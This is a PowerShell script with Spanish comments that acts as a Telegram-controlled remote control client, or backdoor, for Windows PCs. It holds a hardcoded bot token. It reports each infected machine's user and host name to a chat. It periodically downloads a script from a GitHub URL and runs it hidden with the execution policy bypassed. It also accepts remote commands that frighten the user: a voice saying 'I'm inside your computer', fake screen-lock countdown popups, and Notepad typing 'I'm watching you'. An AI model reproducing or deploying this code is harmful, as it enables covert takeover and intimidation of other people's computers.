# ==============================================================================
# CONFIGURACIÓN DEL BOT DE TELEGRAM (Pon tus datos aquí)
# ==============================================================================
$Token  = "8935867266:AAELjvUiJRXauSgYmmHAMmut-SOJWXyYImg" # REEMPLAZA CON TU TOKEN REAL COMPLETO
$ChatID = "1018796719"                                    # REEMPLAZA CON TU CHAT ID REAL COMPLETO

# para la auto-actualización (Misma que usa el cargador)
$UrlGitHub  = "https://githubusercontent.com" 
$RutaLocal  = "$PSScriptRoot\cliente_base.ps1"

# Construcción de URL fija ultra-estable que acabamos de validar
$URL    = "https://api.telegram.org/bot" + $Token
$MiPC   = $env:COMPUTERNAME
$User   = $env:USERNAME
# ==============================================================================
# NO BORRAR #############################################################
# ==============================================================================
# Control de tiempo para la actualización automática (Cada 15 minutos)
$Cronometro = [System.Diagnostics.Stopwatch]::StartNew()

# ==============================================================================
# REGISTRAR APIS Y SEGURIDAD
# ==============================================================================
try {
    $MethodDefinition = '[DllImport("user32.dll")] public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);'
    Add-Type -MemberDefinition $MethodDefinition -Name "Win32Utils" -Namespace "Win32" -ErrorAction SilentlyContinue
} catch {}

# Habilitar TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# ==============================================================================
# LIMPIAR HISTORIAL ANTES DE INICIAR
# ==============================================================================
$LastUpdateID = 0
try {
    $PreCheck = Invoke-RestMethod -Uri "$URL/getUpdates?timeout=1" -Method Get
    if ($PreCheck.result.Count -gt 0) {
        $LastUpdateID = $PreCheck.result[-1].update_id + 1
        [void](Invoke-RestMethod -Uri "$URL/getUpdates?offset=$LastUpdateID&timeout=1" -Method Get)
    }
} catch {}

# --- NOTIFICAR A TELEGRAM QUE LA PC SE ENCENDIÓ ---
try {
    $MensajeInicio = "PC En Linea y Protegida: " + $User + "@" + $MiPC
    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $MensajeInicio })
} catch {}

# ==============================================================================
# BUCLE PRINCIPAL CON SISTEMA DE IDS NUMÉRICOS CORREGIDO
# ==============================================================================
while ($true) {
    try {
        # 🔄 SISTEMA DE AUTO-ACTUALIZACIÓN CADA 15 MINUTOS 🔄
        if ($Cronometro.Elapsed.TotalMinutes -ge 1) {
            try {
                # Intenta descargar la nueva versión de GitHub
                Invoke-WebRequest -Uri $UrlGitHub -OutFile $RutaLocal -TimeoutSec 10 -ErrorAction Stop
                
                # Si se descargó con éxito, ejecuta la nueva versión de forma invisible
                if (Test-Path $RutaLocal) {
                    Start-Process "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$RutaLocal`""
                    
                    # Notifica al bot que se actualizó con éxito
                    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "🔄 Script ID [$MiPC] actualizado automáticamente a la última versión de GitHub." })
                    
                    # Termina el script viejo inmediatamente para que no queden dos corriendo
                    Exit
                }
            } catch {
                # Si falla (ej. sin internet), reinicia el cronómetro para reintentar en 15 min
                $Cronometro.Restart()
            }
        }

        # Conexión con Telegram (Espera mensajes hasta por 15 segundos)
        $Updates = Invoke-RestMethod -Uri "$URL/getUpdates?offset=$LastUpdateID&timeout=15" -Method Get
        
        foreach ($Update in $Updates.result) {
            $LastUpdateID = $Update.update_id + 1
            $TextoRecibido = $Update.message.text
            $RemitenteChatID = $Update.message.chat.id

            if ($RemitenteChatID -eq $ChatID -and $null -ne $TextoRecibido) {
                
                $Partes = $TextoRecibido -split " "
                $Comando = [string]$Partes[0]
                $Comando = $Comando.ToLower()
                
                $IDDestino = ""
                if ($Partes.Count -gt 1) {
                    $IDDestino = [string]$Partes[1]
                }

                # --- COMANDO GLOBAL: /lista ---
                if ($Comando -eq "/lista") {
                    $LetrasPC = [char[]]$MiPC
                    $TotalAscii = 0
                    foreach ($Letra in $LetrasPC) { $TotalAscii += [int]$Letra }
                    $Seed = $TotalAscii % 9
                    if ($Seed -eq 0) { $Seed = 1 }
                    $NumAsignado = [string]$Seed

                    $RespuestaLista = "🖥️ EQUIPO EN LINEA:`nID Numerico: [" + $NumAsignado + "] -> " + $User + "@" + $MiPC
                    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $RespuestaLista })
                    continue
                }

                # --- COMANDO GLOBAL DE AYUDA: /ayuda ---
                if ($Comando -eq "/ayuda") {
                    $TextoAyuda = "MANUAL DE CONTROL NUMERICO`n`n" +
                                  "Comandos Globales:`n" +
                                  " /lista - Ver que numero de ID tomo cada PC.`n" +
                                  " /ayuda - Ver este menu.`n`n" +
                                  "Comandos Individuales:`n" +
                                  " /cuenta [Numero]`n" +
                                  " /dentro [Numero]`n" +
                                  " /notepad [Numero]`n`n" +
                                  "Ejemplo de uso: /notepad 1"
                    
                    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $TextoAyuda })
                    continue
                }

                # CALCULAR MI PROPIO ID PARA COMPARAR
                $MisLetras = [char[]]$MiPC
                $MiAscii = 0
                foreach ($M in $MisLetras) { $MiAscii += [int]$M }
                $MiSeed = $MiAscii % 9
                if ($MiSeed -eq 0) { $MiSeed = 1 }
                $MiIDNum = [string]$MiSeed

                # VALIDACIÓN CRÍTICA: Solo ejecuta si el número coincide con el de esta máquina
                if ($IDDestino -eq $MiIDNum -and $IDDestino -ne "") {
                    
                    switch ($Comando) {
                        
                        "/dentro" {
                            Add-Type -AssemblyName System.Speech
                            $synthesizer = New-Object System.Speech.Synthesis.SpeechSynthesizer
                            $synthesizer.Speak("Hola. Estoy dentro de tu computadora.")
                        }                       
                        
                        "/cuenta" {
                            $wsh = New-Object -ComObject WScript.Shell
                            for ($i = 60; $i -gt 0; $i--) {
                                $wsh.Popup("Faltan $i segundos para desbloquear la pantalla.", 1, "Cuenta Regresiva", 0 + 48 + 4096)
                            }
                        }
                           
                        "/notepad" {
                            Start-Process "notepad.exe"
                            Start-Sleep -Milliseconds 500
                            $wsh = New-Object -ComObject WScript.Shell
                            $wsh.SendKeys("Te estoy observando por Internet... 👀")
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "Bloc de notas abierto en ID " + $MiIDNum })
                        }
                    }
                }
            }
        }
    } catch {
        Start-Sleep -Seconds 3
    }
    Start-Sleep -Seconds 2
}
